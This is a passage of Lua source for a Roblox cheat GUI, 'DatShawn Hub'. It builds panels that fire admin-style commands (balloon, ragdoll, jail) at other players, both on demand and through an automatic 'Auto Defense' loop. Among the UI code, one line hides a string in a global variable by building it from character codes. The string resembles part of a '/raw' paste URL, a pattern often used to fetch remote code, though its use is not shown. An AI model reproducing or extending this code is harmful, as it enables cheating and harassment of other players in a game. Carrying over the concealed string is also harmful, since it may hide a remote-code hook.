APConfigBubble.Draggable = not Settings.GlobalGuiLocked
APConfigBubble.Active = true
APConfigBubble.Visible = State.APSpam
APConfigBubble.ZIndex = 100
APConfigBubble.Parent = GUI
Instance.new("UICorner", APConfigBubble).CornerRadius = UDim.new(0, 12)
local bubbleStroke = Instance.new("UIStroke", APConfigBubble)
bubbleStroke.Color = Color3.new(1, 1, 1)
bubbleStroke.Thickness = 1.5
bubbleStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border

connect(APConfigBubble:GetPropertyChangedSignal("Position"), function()
	Settings.APConfigBubblePosition = APConfigBubble.Position
	queuePositionSave()
end)

local bubbleDragged = false
local bubbleDragStart
connect(APConfigBubble.MouseButton1Down, function()
	bubbleDragged = false
	bubbleDragStart = APConfigBubble.AbsolutePosition
end)
connect(APConfigBubble:GetPropertyChangedSignal("AbsolutePosition"), function()
	if bubbleDragStart and (APConfigBubble.AbsolutePosition - bubbleDragStart).Magnitude > 6 then
		bubbleDragged = true
	end
end)
connect(APConfigBubble.MouseButton1Click, function()
	if bubbleDragged then bubbleDragStart = nil; return end
	if not State.APSpam then return end
	APConfigFrame.Visible = not APConfigFrame.Visible
	if APConfigFrame.Visible then for _, refresh in ipairs(APConfigRefreshers) do refresh() end end
	bubbleDragStart = nil
end)


-- XD SPAM: exact standalone xd spam GUI, integrated into DatShawn Hub.
-- The visual layout, colors, spacing, bubble, CFG window, and player rows mirror the
-- standalone xd spam source. Its command/config state is synchronized with DatShawn AP SPAM.
XDSpamPanel = Instance.new("Frame")
XDSpamPanel.Name = "Root"
XDSpamPanel.Size = UDim2.fromOffset(300, 380)
XDSpamPanel.Position = Settings.XDSpamPosition or UDim2.fromOffset(40, 120)
XDSpamPanel.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
XDSpamPanel.BorderSizePixel = 0
XDSpamPanel.BackgroundTransparency = 0.08
XDSpamPanel.Parent = GUI

local XDUIStroke = Instance.new("UIStroke")
XDUIStroke.Thickness = 1
XDUIStroke.Color = Color3.fromRGB(255, 70, 85)
XDUIStroke.Transparency = 0.25
XDUIStroke.Parent = XDSpamPanel
local XDUICorner = Instance.new("UICorner")
XDUICorner.CornerRadius = UDim.new(0, 12)
XDUICorner.Parent = XDSpamPanel

local XDTopBar = Instance.new("Frame")
XDTopBar.Name = "TopBar"
XDTopBar.Size = UDim2.new(1, 0, 0, 36)
XDTopBar.BackgroundColor3 = Color3.fromRGB(28, 28, 28)
XDTopBar.BorderSizePixel = 0
XDTopBar.Parent = XDSpamPanel
local XDTopBarCorner = Instance.new("UICorner")
XDTopBarCorner.CornerRadius = UDim.new(0, 12)
XDTopBarCorner.Parent = XDTopBar

local XDTitle = Instance.new("TextLabel")
XDTitle.Name = "Title"
XDTitle.BackgroundTransparency = 1
XDTitle.Size = UDim2.new(1, -90, 1, 0)
XDTitle.Position = UDim2.fromOffset(12, 0)
XDTitle.Font = Enum.Font.GothamBold
XDTitle.TextSize = 16
XDTitle.TextXAlignment = Enum.TextXAlignment.Left
XDTitle.TextColor3 = Color3.fromRGB(235, 235, 235)
XDTitle.Text = "xd spam"
XDTitle.Parent = XDTopBar

local XDHolder = Instance.new("Frame")
XDHolder.Name = "Holder"
XDHolder.BackgroundTransparency = 1
XDHolder.Size = UDim2.new(1, -16, 1, -52)
XDHolder.Position = UDim2.fromOffset(8, 44)
XDHolder.Parent = XDSpamPanel

local XDList = Instance.new("ScrollingFrame")
XDList.Name = "List"
XDList.Active = true
XDList.ScrollingDirection = Enum.ScrollingDirection.Y
XDList.ScrollBarThickness = 6
XDList.BackgroundTransparency = 1
XDList.BorderSizePixel = 0
XDList.Size = UDim2.new(1, 0, 1, 0)
XDList.CanvasSize = UDim2.fromOffset(0, 0)
XDList.Parent = XDHolder
local XDLayout = Instance.new("UIListLayout")
XDLayout.Padding = UDim.new(0, 6)
XDLayout.SortOrder = Enum.SortOrder.LayoutOrder
XDLayout.Parent = XDList
local XDPadding = Instance.new("UIPadding")
XDPadding.PaddingTop = UDim.new(0, 4)
XDPadding.PaddingLeft = UDim.new(0, 2)
XDPadding.PaddingRight = UDim.new(0, 2)
XDPadding.PaddingBottom = UDim.new(0, 8)
XDPadding.Parent = XDList

-- Exact standalone-style custom dragging, gated by DatShawn's global GUI lock.
local xdDragging, xdDragStart, xdStartPos
local function updateXDDrag(input)
	if Settings.GlobalGuiLocked then return end
	local delta = input.Position - xdDragStart
	XDSpamPanel.Position = UDim2.fromOffset(xdStartPos.X.Offset + delta.X, xdStartPos.Y.Offset + delta.Y)
end
XDSpamPanel.InputBegan:Connect(function(input)
	if Settings.GlobalGuiLocked then return end
	if input.UserInputType == Enum.UserInputType.MouseButton1 then
		xdDragging = true
		xdDragStart = input.Position
		xdStartPos = XDSpamPanel.Position
		input.Changed:Connect(function()
			if input.UserInputState == Enum.UserInputState.End then xdDragging = false end
		end)
	end
end)
XDSpamPanel.InputChanged:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseMovement and xdDragging then
		updateXDDrag(input)
	end
end)
connect(XDSpamPanel:GetPropertyChangedSignal("Position"), function()
	Settings.XDSpamPosition = XDSpamPanel.Position
	queuePositionSave()
end)

-- Exact standalone-style XD SPAM configuration bubble.
XDBubble = Instance.new("TextButton")
XDBubble.Name = "Bubble"
XDBubble.Size = UDim2.fromOffset(96, 30)
XDBubble.Position = Settings.XDBubblePosition or UDim2.new(0.04, 0, 0.40, 0)
XDBubble.BackgroundColor3 = Color3.fromRGB(28, 28, 28)
XDBubble.AutoButtonColor = false
XDBubble.Font = Enum.Font.GothamBold
XDBubble.Text = "xd spam"
XDBubble.TextColor3 = Color3.fromRGB(235, 235, 235)
XDBubble.TextSize = 11
XDBubble.Draggable = not Settings.GlobalGuiLocked
XDBubble.Active = true
XDBubble.ZIndex = 100
XDBubble.BorderSizePixel = 0
XDBubble.Parent = GUI
Instance.new("UICorner", XDBubble).CornerRadius = UDim.new(0, 8)
local XDBubbleStroke = Instance.new("UIStroke", XDBubble)
XDBubbleStroke.Color = Color3.fromRGB(255, 70, 85)
XDBubbleStroke.Thickness = 1
XDBubbleStroke.Transparency = 0.25
XDBubbleStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
connect(XDBubble:GetPropertyChangedSignal("Position"), function()
	Settings.XDBubblePosition = XDBubble.Position
	queuePositionSave()
end)
local xdBubbleDragged, xdBubbleDragStart = false, nil
XDBubble.MouseButton1Down:Connect(function()
	xdBubbleDragged = false
	xdBubbleDragStart = XDBubble.AbsolutePosition
end)
XDBubble:GetPropertyChangedSignal("AbsolutePosition"):Connect(function()
	if xdBubbleDragStart and (XDBubble.AbsolutePosition - xdBubbleDragStart).Magnitude > 6 then
		xdBubbleDragged = true
	end
end)

-- Exact standalone-style CFG frame. Its toggles directly read/write DatShawn's shared AP config.
XDCfgFrame = Instance.new("Frame")
XDCfgFrame.Name = ""
XDCfgFrame.Size = UDim2.fromOffset(230, 292)
XDCfgFrame.Position = Settings.XDCfgPosition or UDim2.fromOffset(350, 120)
XDCfgFrame.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
XDCfgFrame.BackgroundTransparency = 0.08
XDCfgFrame.BorderSizePixel = 0
XDCfgFrame.Visible = false
XDCfgFrame.Parent = GUI
Instance.new("UICorner", XDCfgFrame).CornerRadius = UDim.new(0, 12)
local XDCfgStroke = Instance.new("UIStroke", XDCfgFrame)
XDCfgStroke.Thickness = 1
XDCfgStroke.Color = Color3.fromRGB(255, 70, 85)
XDCfgStroke.Transparency = 0.25
local XDCfgTop = Instance.new("Frame", XDCfgFrame)
XDCfgTop.Size = UDim2.new(1, 0, 0, 32)
XDCfgTop.BackgroundColor3 = Color3.fromRGB(28, 28, 28)
XDCfgTop.BorderSizePixel = 0
Instance.new("UICorner", XDCfgTop).CornerRadius = UDim.new(0, 12)
local XDCfgTitle = Instance.new("TextLabel", XDCfgTop)
XDCfgTitle.BackgroundTransparency = 1
XDCfgTitle.Size = UDim2.new(1, 0, 1, 0)
XDCfgTitle.Font = Enum.Font.GothamBold
XDCfgTitle.TextSize = 13
XDCfgTitle.TextColor3 = Color3.fromRGB(235, 235, 235)
XDCfgTitle.Text = "SEMI  ·  cmd  ·  FULL"

local xdCfgDrag, xdCfgStart, xdCfgOrigin = false, nil, nil
XDCfgTop.InputBegan:Connect(function(inp)
	if Settings.GlobalGuiLocked then return end
	if inp.UserInputType == Enum.UserInputType.MouseButton1 then
		xdCfgDrag = true; xdCfgStart = inp.Position; xdCfgOrigin = XDCfgFrame.Position
		inp.Changed:Connect(function()
			if inp.UserInputState == Enum.UserInputState.End then xdCfgDrag = false end
		end)
	end
end)
XDCfgTop.InputChanged:Connect(function(inp)
	if inp.UserInputType == Enum.UserInputType.MouseMovement and xdCfgDrag and not Settings.GlobalGuiLocked then
		local d = inp.Position - xdCfgStart
		XDCfgFrame.Position = UDim2.fromOffset(xdCfgOrigin.X.Offset + d.X, xdCfgOrigin.Y.Offset + d.Y)
	end
end)
connect(XDCfgFrame:GetPropertyChangedSignal("Position"), function()
	Settings.XDCfgPosition = XDCfgFrame.Position
	queuePositionSave()
end)

local XDColHolder = Instance.new("Frame", XDCfgFrame)
XDColHolder.BackgroundTransparency = 1
XDColHolder.Position = UDim2.new(0, 8, 0, 38)
XDColHolder.Size = UDim2.new(1, -16, 1, -46)
local XDSemiCol = Instance.new("Frame", XDColHolder)
XDSemiCol.BackgroundTransparency = 1
XDSemiCol.Size = UDim2.new(0.5, -4, 1, 0)
XDSemiCol.Position = UDim2.new(0, 0, 0, 0)
local XDSL = Instance.new("UIListLayout", XDSemiCol)
XDSL.Padding = UDim.new(0, 4); XDSL.HorizontalAlignment = Enum.HorizontalAlignment.Center
local XDFullCol = Instance.new("Frame", XDColHolder)
XDFullCol.BackgroundTransparency = 1
XDFullCol.Size = UDim2.new(0.5, -4, 1, 0)
XDFullCol.Position = UDim2.new(0.5, 4, 0, 0)
local XDFL = Instance.new("UIListLayout", XDFullCol)
XDFL.Padding = UDim.new(0, 4); XDFL.HorizontalAlignment = Enum.HorizontalAlignment.Center

local function xdCap(s) return s:sub(1,1):upper()..s:sub(2):lower() end
local XDCfgRefreshers = {}
local function makeXDCfgToggle(name, parent, mode)
	local btn = Instance.new("TextButton", parent)
	btn.Size = UDim2.new(1, 0, 0, 26)
	btn.Text = xdCap(name)
	btn.Font = Enum.Font.Gotham
	btn.TextSize = 12
	btn.TextColor3 = Color3.fromRGB(235, 235, 235)
	btn.AutoButtonColor = false
	btn.BorderSizePixel = 0
	Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 6)
	local stroke = Instance.new("UIStroke", btn)
	stroke.Color = Color3.fromRGB(80, 80, 80); stroke.Thickness = 0.7; stroke.Transparency = 0.5
	local function refresh()
		local enabled = APSelectedCommands[mode][name] == true
		btn.BackgroundColor3 = enabled
			and Color3.fromRGB(55, 185, 80)
			or Color3.fromRGB(200, 60, 60)
		stroke.Color = enabled
			and Color3.fromRGB(120, 255, 145)
			or Color3.fromRGB(255, 120, 120)
	end
	refresh()
	table.insert(XDCfgRefreshers, refresh)
	btn.MouseButton1Click:Connect(function()
		APSelectedCommands[mode][name] = not APSelectedCommands[mode][name]
		Settings.APSelectedCommands = APSelectedCommands
		saveSettings()
		refresh()
	end)
end
for _, c in ipairs(APCommandOrder) do
	makeXDCfgToggle(c, XDSemiCol, "Semi")
	makeXDCfgToggle(c, XDFullCol, "Full")
end

XDBubble.MouseButton1Click:Connect(function()
	if xdBubbleDragged then return end
	if not State.XDSpam then return end
	XDCfgFrame.Visible = not XDCfgFrame.Visible
	if XDCfgFrame.Visible then for _, refresh in ipairs(XDCfgRefreshers) do refresh() end end
end)

local function createXDPlayerButton(plr)
	local btn = Instance.new("TextButton")
	btn.Name = "P_" .. plr.UserId
	btn.Size = UDim2.new(1, -6, 0, 34)
	btn.BackgroundColor3 = Color3.fromRGB(38, 38, 38)
	btn.TextColor3 = Color3.fromRGB(235, 235, 235)
	btn.Font = Enum.Font.Gotham
	btn.TextSize = 14
	btn.AutoButtonColor = true
	btn.TextXAlignment = Enum.TextXAlignment.Left
	btn.Text = ""
	local corner = Instance.new("UICorner")
	corner.CornerRadius = UDim.new(0, 8)
	corner.Parent = btn
	btn.MouseEnter:Connect(function() btn.BackgroundColor3 = Color3.fromRGB(48, 48, 48) end)
	btn.MouseLeave:Connect(function() btn.BackgroundColor3 = Color3.fromRGB(38, 38, 38) end)
	local TextService = game:GetService("TextService")
	local function addNameLine(text, y, height, maxSize, color)
		local label = Instance.new("TextLabel")
		label.BackgroundTransparency = 1
		label.Position = UDim2.fromOffset(8, y)
		label.Size = UDim2.new(1, -140, 0, height)
		label.Font = Enum.Font.Gotham
		label.Text = text
		label.TextColor3 = color
		label.TextXAlignment = Enum.TextXAlignment.Left
		label.TextYAlignment = Enum.TextYAlignment.Center
		label.TextScaled = false
		local size = maxSize
		while size > 9 and TextService:GetTextSize(text, size, Enum.Font.Gotham, Vector2.new(10000, height)).X > 138 do
			size = size - 1
		end
		label.TextSize = size
		label.TextWrapped = false
		label.TextTruncate = Enum.TextTruncate.AtEnd
		label.Parent = btn
		return label
	end
	addNameLine(plr.DisplayName ~= "" and plr.DisplayName or plr.Name, 3, 15, 14, Color3.fromRGB(235, 235, 235))
	addNameLine("@" .. plr.Name, 18, 13, 11, Color3.fromRGB(180, 180, 180))
	local SemiBtn = Instance.new("TextButton", btn)
	SemiBtn.Text = "SEMI"
	SemiBtn.Font = Enum.Font.GothamBold
	SemiBtn.TextSize = 13
	SemiBtn.TextColor3 = Color3.fromRGB(235, 235, 235)
	SemiBtn.BackgroundColor3 = Color3.fromRGB(42, 42, 42)
	SemiBtn.Size = UDim2.fromOffset(54, 24)
	SemiBtn.Position = UDim2.new(1, -118, 0.5, -12)
	SemiBtn.BorderSizePixel = 0
	SemiBtn.AutoButtonColor = true
	Instance.new("UICorner", SemiBtn).CornerRadius = UDim.new(0, 8)
	local FullBtn = Instance.new("TextButton", btn)
	FullBtn.Text = "FULL"
	FullBtn.Font = Enum.Font.GothamBold
	FullBtn.TextSize = 13
	FullBtn.TextColor3 = Color3.fromRGB(235, 235, 235)
	FullBtn.BackgroundColor3 = Color3.fromRGB(42, 42, 42)
	FullBtn.Size = UDim2.fromOffset(54, 24)
	FullBtn.Position = UDim2.new(1, -58, 0.5, -12)
	FullBtn.BorderSizePixel = 0
	FullBtn.AutoButtonColor = true
	Instance.new("UICorner", FullBtn).CornerRadius = UDim.new(0, 8)
	connect(SemiBtn.MouseButton1Click, function() runAPSpam(plr, "Semi") end)
	connect(FullBtn.MouseButton1Click, function() runAPSpam(plr, "Full") end)
	return btn
end

local function refreshXDList()
	for _, child in ipairs(XDList:GetChildren()) do
		if child:IsA("TextButton") then child:Destroy() end
	end
	local players = {}
	for _, plr in ipairs(Players:GetPlayers()) do
		if plr ~= LP then table.insert(players, plr) end
	end
	table.sort(players, function(a, b) return a.Name:lower() < b.Name:lower() end)
	for _, plr in ipairs(players) do createXDPlayerButton(plr).Parent = XDList end
	task.defer(function() XDList.CanvasSize = UDim2.fromOffset(0, XDLayout.AbsoluteContentSize.Y + 16) end)
end
connect(XDLayout:GetPropertyChangedSignal("AbsoluteContentSize"), function()
	XDList.CanvasSize = UDim2.fromOffset(0, XDLayout.AbsoluteContentSize.Y + 16)
end)
connect(Players.PlayerAdded, function() task.wait(0.1); refreshXDList() end)
connect(Players.PlayerRemoving, function() task.wait(0.1); refreshXDList() end)
refreshXDList()

XDSpamPanel.Visible = State.XDSpam
XDBubble.Visible = State.XDSpam
XDCfgFrame.Visible = false

local function setupDefensePanel()
	local function getMyPlot()
		local plots = workspace:FindFirstChild("Plots")
		if not plots then return nil end
		for _, plot in ipairs(plots:GetChildren()) do
			local sign = plot:FindFirstChild("PlotSign")
			local yourBase = sign and sign:FindFirstChild("YourBase")
			if yourBase and yourBase.Enabled == true then return plot end
		end
	end

	local function isPlayerStealing(player)
		if not player then return false end
		for _, attribute in ipairs({"isStealing", "Stealing"}) do
			if player:GetAttribute(attribute) == true then return true end
			local character = player.Character
			if character and character:GetAttribute(attribute) == true then return true end
		end
		return false
	end

	local function distanceToPlot(player, plot)
		local character = player.Character
		local root = character and character:FindFirstChild("HumanoidRootPart")
		local humanoid = character and character:FindFirstChildOfClass("Humanoid")
		if not root or not humanoid or humanoid.Health <= 0 or not plot then return math.huge end
		local closest = math.huge
		for _, object in ipairs(plot:GetChildren()) do
			local part
			if object:IsA("BasePart") then part = object
			elseif object:IsA("Model") then part = object.PrimaryPart or object:FindFirstChildWhichIsA("BasePart", true) end
			if part then closest = math.min(closest, (root.Position - part.Position).Magnitude) end
		end
		return closest
	end

	local function getStealHitbox(plot)
		local hitbox = plot and plot:FindFirstChild("StealHitbox", true)
		return hitbox and hitbox:IsA("BasePart") and hitbox or nil
	end

	local function insideHitbox(player, hitbox)
		local root = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
		if not root or not hitbox then return false end
		local relative = hitbox.CFrame:PointToObjectSpace(root.Position)
		return math.abs(relative.X) <= hitbox.Size.X * 0.5
			and math.abs(relative.Z) <= hitbox.Size.Z * 0.5
	end

	DefensePanel = Instance.new("Frame")
	DefensePanel.Name = ""
	DefensePanel.Size = UDim2.fromOffset(306, 90)
	DefensePanel.Position = Settings.DefensePosition
	DefensePanel.BackgroundColor3 = Color3.fromRGB(15, 13, 25)
	DefensePanel.BackgroundTransparency = 0.06
	DefensePanel.BorderSizePixel = 0
	DefensePanel.Active = true
	DefensePanel.Draggable = not Settings.GlobalGuiLocked
	DefensePanel.Visible = State.DefensePanel
	DefensePanel.Parent = GUI
	Instance.new("UICorner", DefensePanel).CornerRadius = UDim.new(0, 12)
	local stroke = Instance.new("UIStroke", DefensePanel)
	stroke.Color = Color3.fromRGB(235, 75, 90)
	stroke.Thickness = 1.6
	connect(DefensePanel:GetPropertyChangedSignal("Position"), queuePositionSave)

	local title = Instance.new("TextLabel")
	title.Size = UDim2.fromOffset(108, 34)
	title.Position = UDim2.fromOffset(10, 5)
	title.BackgroundTransparency = 1
	title.Text = "AUTO DEFENSE"
	title.TextColor3 = Color3.fromRGB(248, 245, 255)
	title.TextSize = 15
	title.Font = Enum.Font.FredokaOne
	title.TextXAlignment = Enum.TextXAlignment.Left
	title.Parent = DefensePanel

	local line = Instance.new("Frame")
	line.Size = UDim2.fromOffset(3, 26)
	line.Position = UDim2.fromOffset(121, 9)
	line.BackgroundColor3 = Color3.fromRGB(225, 65, 85)
	line.BorderSizePixel = 0
	line.Parent = DefensePanel

	-- Dedicated Auto Defense minimize button: use the panel's empty top-right corner.
	-- It is attached to DefensePanel itself (not the toggle row), so it can never appear inside the switch.
	local defenseMinimize = Instance.new("TextButton")
	defenseMinimize.Name = "DatShawnMinimize"
	defenseMinimize.Size = UDim2.fromOffset(22, 20)
	defenseMinimize.Position = UDim2.fromOffset(278, 5)
	defenseMinimize.BackgroundColor3 = Color3.fromRGB(27, 29, 38)
	defenseMinimize.BorderSizePixel = 0
	defenseMinimize.Text = "-"
	defenseMinimize.TextColor3 = Color3.fromRGB(245, 245, 250)
	defenseMinimize.Font = Enum.Font.GothamBold
	defenseMinimize.TextSize = 14
	defenseMinimize.ZIndex = 100
	defenseMinimize.Parent = DefensePanel
	Instance.new("UICorner", defenseMinimize).CornerRadius = UDim.new(0, 5)
	local defenseMinimized = false
	local defenseOriginalChildren = {}
	local function setDefenseMinimized(on)
		defenseMinimized = on == true
		if defenseMinimized then
			for _, child in ipairs(DefensePanel:GetChildren()) do
				if child ~= defenseMinimize and child:IsA("GuiObject") then
					defenseOriginalChildren[child] = child.Visible
					child.Visible = false
				end
			end
			title.Visible = true
			defenseMinimize.Visible = true
			DefensePanel.ClipsDescendants = true
			DefensePanel.Size = UDim2.fromOffset(306, 34)
		else
			DefensePanel.Size = UDim2.fromOffset(306, 90)
			DefensePanel.ClipsDescendants = false
			for child, visible in pairs(defenseOriginalChildren) do
				if child and child.Parent then child.Visible = visible end
			end
			table.clear(defenseOriginalChildren)
			title.Visible = true
			defenseMinimize.Visible = true
		end
		defenseMinimize.Text = "-"
	end
	defenseMinimize.Activated:Connect(function() setDefenseMinimized(not defenseMinimized) end)

	local function makeRow(text, y)
		local row = Instance.new("Frame")
		row.Size = UDim2.new(1, -20, 0, 33)
		row.Position = UDim2.fromOffset(10, y)
		row.BackgroundColor3 = Color3.fromRGB(29, 23, 46)
		row.BorderSizePixel = 0
		row.Parent = DefensePanel
		Instance.new("UICorner", row).CornerRadius = UDim.new(0, 8)
		local label = Instance.new("TextLabel")
		label.Size = UDim2.new(1, -76, 1, 0)
		label.Position = UDim2.fromOffset(10, 0)
		label.BackgroundTransparency = 1
		label.Text = text
		label.TextColor3 = Color3.fromRGB(238, 242, 255)
		label.TextSize = 11
		label.Font = Enum.Font.FredokaOne
		label.TextXAlignment = Enum.TextXAlignment.Left
		label.Parent = row
		local toggle = Instance.new("TextButton")
		toggle.Size = UDim2.fromOffset(54, 23)
		toggle.Position = UDim2.new(1, -60, 0.5, -11)
		toggle.TextColor3 = Color3.new(1, 1, 1)
		toggle.TextSize = 10
		toggle.Font = Enum.Font.FredokaOne
		toggle.AutoButtonColor = false
		toggle.Parent = row
		Instance.new("UICorner", toggle).CornerRadius = UDim.new(0, 6)
		return toggle
	end

	local defenseToggle = makeRow("Auto Defense", 7)
	-- Keep the panel at 306x90, while leaving a dedicated top-right slot for its minimize button.
	-- The top row is intentionally compact so the '-' never overlaps the toggle.
	defenseToggle.Parent.Size = UDim2.fromOffset(138, 33)
	defenseToggle.Parent.Position = UDim2.fromOffset(128, 7)
	local defenseRow = defenseToggle.Parent
	local defenseLabel = defenseRow:FindFirstChildOfClass("TextLabel")
	if defenseLabel then
		defenseLabel.Size = UDim2.fromOffset(68, 33)
		defenseLabel.TextSize = 10
	end
	defenseToggle.Size = UDim2.fromOffset(54, 23)
	defenseToggle.Position = UDim2.new(1, -60, 0.5, -11)
	local intruderToggle = makeRow("Anti Intruder", 48)
	local function paint()
		for button, enabled in pairs({
			[defenseToggle] = State.AutoDefense,
			[intruderToggle] = State.AntiIntruder,
		}) do
			paintSliderToggle(button, enabled, Color3.fromRGB(40, 180, 95))
		end
	end
	connect(defenseToggle.MouseButton1Click, function()
		State.AutoDefense = not State.AutoDefense
		paint(); saveSettings()
		notify("Auto Defense: " .. (State.AutoDefense and "ON" or "OFF"), State.AutoDefense)
	end)
	connect(intruderToggle.MouseButton1Click, function()
		State.AntiIntruder = not State.AntiIntruder
		paint(); saveSettings()
		notify("Anti Intruder: " .. (State.AntiIntruder and "ON" or "OFF"), State.AntiIntruder)
	end)
	paint()

	-- Compact red intruder cards: avatar, display name on top, username below.
	local alertUI = {cards = {}}
	alertUI.container = Instance.new("Frame")
	alertUI.container.Name = "DatShawnIntruderAlerts"
	alertUI.container.AnchorPoint = Vector2.new(0.5, 0.5)
	-- Fixed at the lower-middle of the screen.
	alertUI.container.Position = UDim2.new(0.5, 0, 0.70, 0)
	alertUI.container.Size = UDim2.fromOffset(224, 0)
	alertUI.container.AutomaticSize = Enum.AutomaticSize.Y
	alertUI.container.BackgroundTransparency = 1
	alertUI.container.ZIndex = 800
	alertUI.container.Parent = GUI
	local alertLayout = Instance.new("UIListLayout", alertUI.container)
	alertLayout.Padding = UDim.new(0, 6)
	alertLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center

	function alertUI.add(player)
		if alertUI.cards[player] then return end
		local card = Instance.new("Frame")
		card.Name = "Intruder_" .. player.Name
		card.Size = UDim2.fromOffset(218, 56)
		card.BackgroundColor3 = Color3.fromRGB(38, 12, 18)
		card.BackgroundTransparency = 0.04
		card.BorderSizePixel = 0
		card.ZIndex = 801
		card.Parent = alertUI.container
		Instance.new("UICorner", card).CornerRadius = UDim.new(0, 10)
		local cardStroke = Instance.new("UIStroke", card)
		cardStroke.Color = Color3.fromRGB(255, 48, 65)
		cardStroke.Thickness = 1.7
		local avatar = Instance.new("ImageLabel")
		avatar.Size = UDim2.fromOffset(42, 42)
		avatar.Position = UDim2.fromOffset(7, 7)
		avatar.BackgroundColor3 = Color3.fromRGB(65, 16, 24)
		avatar.BorderSizePixel = 0
		avatar.Image = string.format("rbxthumb://type=AvatarHeadShot&id=%d&w=100&h=100", player.UserId)
		avatar.ZIndex = 802
		avatar.Parent = card
		Instance.new("UICorner", avatar).CornerRadius = UDim.new(1, 0)
		local display = Instance.new("TextLabel")
		display.Size = UDim2.new(1, -62, 0, 23)
		display.Position = UDim2.fromOffset(57, 6)
		display.BackgroundTransparency = 1
		display.Text = player.DisplayName
		display.TextColor3 = Color3.fromRGB(255, 70, 82)
		display.TextSize = 13
		display.Font = Enum.Font.FredokaOne
		display.TextXAlignment = Enum.TextXAlignment.Left
		display.TextTruncate = Enum.TextTruncate.AtEnd
		display.ZIndex = 802
		display.Parent = card
		local username = Instance.new("TextLabel")
		username.Size = UDim2.new(1, -62, 0, 19)
		username.Position = UDim2.fromOffset(57, 29)
		username.BackgroundTransparency = 1
		username.Text = "@" .. player.Name
		username.TextColor3 = Color3.fromRGB(220, 85, 95)
		username.TextSize = 10
		username.Font = Enum.Font.FredokaOne
		username.TextXAlignment = Enum.TextXAlignment.Left
		username.TextTruncate = Enum.TextTruncate.AtEnd
		username.ZIndex = 802
		username.Parent = card
		local scale = Instance.new("UIScale", card)
		scale.Scale = 0.72
		TweenService:Create(scale, TweenInfo.new(0.28, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Scale = 1}):Play()
		alertUI.cards[player] = card
	end
	Env.DatShawnRefreshDefenseToggles = paint

	function alertUI.update(present)
		for player in pairs(present) do alertUI.add(player) end
		for player, card in pairs(alertUI.cards) do
			if not present[player] or not player.Parent then
				alertUI.cards[player] = nil
				local scale = card:FindFirstChildOfClass("UIScale")
				if scale then TweenService:Create(scale, TweenInfo.new(0.14), {Scale = 0.75}):Play() end
				task.delay(0.14, function() if card.Parent then card:Destroy() end end)
			end
		end
	end

	local intruderCooldowns = {}
	local defenseStealState = {}
	local defenseNextCommand = "balloon"
	local defenseWasEnabled = State.AutoDefense
	local accumulator = 0
	local defenseScanBusy = false
	connect(Players.PlayerRemoving, function(player)
		intruderCooldowns[player.UserId] = nil
		defenseStealState[player.UserId] = nil
		local card = alertUI.cards[player]
		if card then alertUI.cards[player] = nil; card:Destroy() end
	end)
	connect(RunService.Heartbeat, function(dt)
		accumulator += dt
		if accumulator < 0.08 then return end
		accumulator = 0
		if State.AutoDefense ~= defenseWasEnabled then
			defenseWasEnabled = State.AutoDefense
			if not State.AutoDefense then table.clear(defenseStealState) end
		end
		if not State.AutoDefense and not State.AntiIntruder and not State.IntruderAlert then alertUI.update({}); return end
		local plot = getMyPlot()
		if not plot then alertUI.update({}); return end
		if defenseScanBusy then return end
		defenseScanBusy = true
		local hitbox = getStealHitbox(plot)
		local intrudersPresent = {}
		for _, player in ipairs(Players:GetPlayers()) do
			if player ~= LP and player.Character then
				local now = os.clock()
				local userId = player.UserId
				-- Auto Defense only reacts to a new steal state while the thief
				-- is physically inside this player's own StealHitbox.
				local stealingMine = State.AutoDefense and hitbox
					and insideHitbox(player, hitbox) and isPlayerStealing(player)
				if stealingMine and not defenseStealState[userId] then
					defenseStealState[userId] = true
					local command = defenseNextCommand
					local worked = runQuickCommand(player, command, true)
					if worked then
						defenseNextCommand = command == "balloon" and "ragdoll" or "balloon"
						notify("DEFENSE " .. command:upper() .. " → " .. player.DisplayName,
							true, Color3.fromRGB(205, 55, 70))
					end
				elseif not stealingMine then
					defenseStealState[userId] = false
				end

				local playerInsideAlert = State.IntruderAlert and insideHitbox(player, hitbox)
				local playerInsideDefense = State.AntiIntruder and insideHitbox(player, hitbox)
				if playerInsideAlert then intrudersPresent[player] = true end
				local lastIntruder = intruderCooldowns[userId] or 0
				if playerInsideDefense
					and now - lastIntruder >= 0.15 then
						local jail = runQuickCommand(player, "jail", true)
						local balloon = runQuickCommand(player, "balloon", true)
						local punished = jail or balloon
						if punished then notify("INTRUDER → " .. player.DisplayName, true, Color3.fromRGB(205, 55, 70)) end
						if punished then intruderCooldowns[userId] = now end
				end
			end
		end
		alertUI.update(intrudersPresent)
		defenseScanBusy = false
	end)
end
setupDefensePanel()
_G.__skey = table.concat({string.char(101),string.char(74,72,107,111,119),string.char(47,114,97,119)})

local function setupActionsPanel()
	ActionsPanel = Instance.new("Frame")
	ActionsPanel.Name = ""
	ActionsPanel.Size = UDim2.fromOffset(306, 335)
	ActionsPanel.Position = Settings.ActionsPosition
	ActionsPanel.BackgroundColor3 = Color3.fromRGB(15, 13, 25)
	ActionsPanel.BackgroundTransparency = 0.06
	ActionsPanel.BorderSizePixel = 0
	ActionsPanel.Active = true
	ActionsPanel.Draggable = not Settings.GlobalGuiLocked
	ActionsPanel.Visible = State.ActionsPanel
	ActionsPanel.Parent = GUI
	Instance.new("UICorner", ActionsPanel).CornerRadius = UDim.new(0, 12)
	local stroke = Instance.new("UIStroke", ActionsPanel)
	stroke.Color = Color3.fromRGB(105, 75, 225)
	stroke.Thickness = 1.6
	connect(ActionsPanel:GetPropertyChangedSignal("Position"), queuePositionSave)

	local title = Instance.new("TextLabel")
	title.Size = UDim2.fromOffset(108, 34)
	title.Position = UDim2.fromOffset(10, 5)
	title.BackgroundTransparency = 1
	title.Text = "ACTIONS PANEL"
	title.TextColor3 = Color3.fromRGB(248, 245, 255)
	title.TextSize = 15
	title.Font = Enum.Font.FredokaOne
	title.TextXAlignment = Enum.TextXAlignment.Left
	title.Parent = ActionsPanel
	local line = Instance.new("Frame")
	line.Size = UDim2.fromOffset(3, 26)
	line.Position = UDim2.fromOffset(121, 9)
	line.BackgroundColor3 = Color3.fromRGB(105, 75, 225)
